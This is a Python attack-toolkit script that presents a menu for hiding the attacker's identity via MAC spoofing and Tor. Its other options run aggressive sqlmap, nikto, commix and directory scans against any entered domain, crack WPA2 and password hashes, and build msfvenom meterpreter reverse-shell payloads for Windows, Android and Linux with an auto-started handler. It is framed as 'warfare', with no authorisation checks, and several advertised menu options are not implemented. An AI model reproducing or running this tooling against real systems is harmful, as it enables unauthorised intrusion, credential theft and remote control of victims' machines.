import os
import subprocess
import time
import random
import json
from datetime import datetime

# --- SYSTEM COLORS & STYLING ---
R, G, B, C, Y, M, W = '\033[91m', '\033[92m', '\033[94m', '\033[96m', '\033[93m', '\033[95m', '\033[97m'
RESET = '\033[0m'

# --- DIRECTORY STRUCTURE (AUTO-CREATE) ---
BASE_DIR = "Mateen_Warfare_Archives"
SUB_DIRS = ["Target_Profiles", "Web_Scans", "WiFi_Captures", "OSINT_Data", "Payloads", "Cracked_Hashes", "Official_Reports"]

def setup_env():
    for d in SUB_DIRS:
        path = os.path.join(BASE_DIR, d)
        if not os.path.exists(path): os.makedirs(path)

def banner():
    os.system('clear')
    colors = [R, G, B, C, M, Y]
    print(random.choice(colors) + "="*80 + RESET)
    print(f"{W}  █████╗ ██████╗ ██████╗ ██╗   ██╗██╗     ███╗   ███╗ █████╗ ████████╗")
    print(f" ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║     ████╗ ████║██╔══██╗╚══██╔══╝")
    print(f" ███████║██████╔╝██║  ██║██║   ██║██║     ██╔████╔██║███████║   ██║   ")
    print(f" ██╔══██║██╔══██╗██║  ██║██║   ██║██║     ██║╚██╔╝██║██╔══██║   ██║   ")
    print(f" ██║  ██║██████╔╝██████╔╝╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║   ██║   ")
    print(random.choice(colors) + "="*80 + RESET)
    print(f"   {Y}[ DEVELOPER: ABDUL MATEEN | VERSION: 17.2 FINAL | STATUS: UNSTOPPABLE ]{RESET}")

# --- MODULE 1: GHOST MODE (IDENTITY PROTECTION) ---
def ghost_mode():
    banner()
    print(f"{R}[!] INITIALIZING GHOST PROTOCOL...{RESET}")
    iface = input(f"{C}[?] Enter Interface (e.g., eth0): {RESET}")
    print(f"{Y}[*] Spoofing MAC and Rotating IP...{RESET}")
    os.system(f"sudo ifconfig {iface} down && sudo macchanger -r {iface} && sudo ifconfig {iface} up")
    os.system("sudo service tor restart")
    print(f"{G}[+] SUCCESS: Identity Masked. Run all commands via Proxychains.{RESET}")
    time.sleep(2)

# --- MODULE 2: WEB WARFARE & BUG DISCOVERY (MERGED) ---
def web_warfare(profile):
    banner()
    target = profile['domain']
    print(f"{Y}>>> TARGET: {target} | SCANNING FOR BUGS (BAGES)...{RESET}")
    
    attacks = [
        (f"whatweb {target}", "Fingerprinting Stack"),
        (f"nikto -h {target} -Tuning 4", "Config & XSS Discovery"),
        (f"sqlmap -u {target} --dbs --batch --risk=3 --level=5", "Deep SQL Injection"),
        (f"dirsearch -u {target} -e php,html,js,txt,log,conf,env", "Hidden Directory Brute"),
        (f"commix --url={target} --batch", "Command Injection Check"),
        (f"nmap --script http-vuln-* -p80,443 {target}", "Nmap Vuln-Engine")
    ]
    
    for i, (cmd, name) in enumerate(attacks, 1):
        print(f"{G}[{i}] Running: {name}{RESET}")
        log_file = f"{BASE_DIR}/Web_Scans/{profile['name']}_{i}.txt"
        os.system(f"{cmd} | tee {log_file}")
    
    input(f"\n{W}[+] All logs saved in {BASE_DIR}/Web_Scans. Press Enter.{RESET}")

# --- MODULE 3: PASSWORD & HASH DESTRUCTION ---
def password_cracking():
    banner()
    print(f"{Y}>>> PASSWORD CRACKING MODULE (ALL METHODS){RESET}")
    print(f"[{G}1{W}] WPA2 Handshake (Hashcat) | [{G}2{W}] MD5/SHA1 (John)")
    print(f"[{G}3{W}] ZIP/PDF Crack          | [{G}4{W}] Custom Wordlist (Crunch)")
    
    ch = input(f"\n{C}[SELECT]> {RESET}")
    wordlist = "/usr/share/wordlists/rockyou.txt"
    
    if ch == '1':
        h = input("Hash file: "); os.system(f"hashcat -m 2500 {h} {wordlist}")
    elif ch == '4':
        min_l = input("Min: "); max_l = input("Max: "); chars = input("Characters: ")
        os.system(f"crunch {min_l} {max_l} {chars} -o {BASE_DIR}/Cracked_Hashes/custom_wordlist.txt")

# --- MODULE 4: NUCLEAR PAYLOADS (MSFVENOM) ---
def nuclear_msf(profile):
    banner()
    lhost = profile['ip']
    print(f"{R}>>> MSFVENOM NUCLEAR PAYLOAD GENERATOR{RESET}")
    print(f"[{G}1{W}] Windows (EXE) | [{G}2{W}] Android (APK) | [{G}3{W}] Linux (ELF)")
    
    type_ch = input(f"\n{C}[SELECT TYPE]> {RESET}")
    port = input(f"{C}[?] LPORT: {RESET}")
    
    payloads = ["windows/x64/meterpreter/reverse_tcp", "android/meterpreter/reverse_tcp", "linux/x64/meterpreter/reverse_tcp"]
    ext = [".exe", ".apk", ".elf"]
    
    out = f"{BASE_DIR}/Payloads/payload_{port}{ext[int(type_ch)-1]}"
    os.system(f"msfvenom -p {payloads[int(type_ch)-1]} LHOST={lhost} LPORT={port} -f {'exe' if type_ch=='1' else 'raw'} > {out}")
    print(f"{G}[+] Payload Ready: {out}{RESET}")
    
    start_m = input(f"{Y}[?] Start Multi-Handler automatically? (y/n): {RESET}")
    if start_m.lower() == 'y':
        rc_file = f"{BASE_DIR}/Payloads/handler.rc"
        with open(rc_file, "w") as f:
            f.write(f"use exploit/multi/handler\nset PAYLOAD {payloads[int(type_ch)-1]}\nset LHOST {lhost}\nset LPORT {port}\nexploit -j")
        os.system(f"msfconsole -r {rc_file}")

# --- MAIN SYSTEM ---
def main():
    if os.geteuid() != 0:
        print(f"{R}[!] ROOT REQUIRED!{RESET}"); return

    setup_env()
    banner()
    
    # Target Acquisition
    p_name = input(f"{C}[?] Project Name: {RESET}")
    p_dom = input(f"{C}[?] Target Domain (URL): {RESET}")
    p_ip = input(f"{C}[?] Your LHOST/IP: {RESET}")
    profile = {"name": p_name, "domain": p_dom, "ip": p_ip}

    while True:
        banner()
        print(f"{W}PROJECT: {p_name} | TARGET: {p_dom} | STATUS: READY{RESET}\n")
        print(f" {R}[1]{W} GHOST MODE (One-Click Anonymity)")
        print(f" {G}[2]{W} DEEP WEB SCAN (Bages & Vuln Engine)")
        print(f" {G}[3]{W} PASSWORD CRACKING (Full Suite)")
        print(f" {G}[4]{W} NUCLEAR PAYLOADS (MSFvenom + Auto-Handler)")
        print(f" {G}[5]{W} OSINT RECON (Sherlock, Harvester, Amass)")
        print(f" {G}[6]{W} WIFI WARFARE (Jamming & Handshakes)")
        print(f" {G}[7]{W} NMAP STEALTH (50+ Advanced Scripts)")
        print(f" {M}[8]{W} GENERATE OFFICIAL REPORT (Abdul Mateen)")
        print(f" {R}[0]{W} SHUTDOWN")

        choice = input(f"\n{C}[MATEEN-GOD-MODE]> {RESET}")

        if choice == '1': ghost_mode()
        elif choice == '2': web_warfare(profile)
        elif choice == '3': password_cracking()
        elif choice == '4': nuclear_msf(profile)
        elif choice == '0': break

if __name__ == "__main__":
    main()